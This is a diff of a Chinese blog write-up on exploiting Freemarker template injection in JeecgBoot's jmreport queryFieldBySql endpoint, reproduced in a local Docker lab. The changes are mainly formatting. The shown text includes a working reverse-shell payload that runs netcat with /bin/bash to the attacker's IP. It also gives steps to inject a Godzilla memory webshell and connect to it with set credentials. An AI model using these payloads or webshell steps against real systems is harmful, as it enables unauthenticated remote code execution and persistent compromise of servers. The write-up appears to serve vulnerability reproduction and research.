@@ -1,6 +1,6 @@
 ---
 title: Freemarker 模板注入到内存马
-date: "2023-08-23 22:13:00"
+date: "2023-08-23 23:59:00"
 index_img: https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/FirstTechnicalInterview_index_img.png
 tags: [Notes]
 categories: [Summary]
@@ -53,11 +53,12 @@ services:
 
 启动 docker 环境：`docker-compose up -d` 或 `docker compose up -d`
 
-后端接口访问地址：`http://localhost:8080/jeecg-boot`
-积木报表地址：`http://localhost:8080/jeecg-boot/jmreport/list`
+后端接口访问地址：http://localhost:8080/jeecg-boot
+
+积木报表地址：http://localhost:8080/jeecg-boot/jmreport/list
 
 ## 漏洞触发
-未授权漏洞点：`http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql`
+未授权漏洞点：http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql
 
 ### RCE
 
@@ -99,7 +100,9 @@ curl --location 'http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql' \
 #### 2. 反弹 shell
 
 本机开启端口监听：`nc -lvvp 2333`
+
 查看本机 IP：`192.168.1.5`
+
 **payload:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nc 192.168.1.5 2333 -e /bin/bash")}`
 
 HTTP 请求体
@@ -164,18 +167,16 @@ curl --location 'http://localhost:8088/jeecg-boot/jmreport/queryFieldBySql' \
 
 1. 注入内存马
 
-下载 [脚本](https://gist.github.com/ReaJason/68fce1f02b0f6f51b8d0984e4266c3ff) 将其命名为 `jeecg-boot-godzilla.py`，编辑脚本将 `back_url` 设置成漏洞复现后端地址例如：`http://localhost:8080/jeecg-boot`，执行 `python jeecg-boot-godzilla.py` 运行脚本等待内存马注入完成。
+下载 [脚本](https://gist.github.com/ReaJason/68fce1f02b0f6f51b8d0984e4266c3ff) 将其命名为 `jeecg-boot-godzilla.py`，编辑脚本将 `back_url` 设置成漏洞复现后端地址例如：`http://localhost:8080/jeecg-boot`，执行 `python jeecg-boot-godzilla.py` 运行脚本等待内存马注入完成（执行显示解析失败是正常现象）。
 
 2. 连接内存马
 
 下载 [godzilla](https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla)，使用 `java -jar godzilla.jar` 启动 `godzilla`，点击目标添加，输入如下参数。
 
-地址请使用 Docker 所在主机 IP，例 `192.168.1.5`
-
-URL：`http://192.168.1.5:8080/jeecg-boot/`
-密码：`pass`
-密钥：`key`
-User-Agent: `Kndux`，将其添加到请求配置其中即可
+- URL：`http://192.168.1.5:8080/jeecg-boot/`，地址请使用 Docker 所在主机 IP，例 `192.168.1.5`
+- 密码：`pass`
+- 密钥：`key`
+- User-Agent: `Kndux`，将其添加到请求配置其中即可
 
 ![基础配置](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/FreemarkerSSTIMemShell_img/godzillaConfig.png)
 
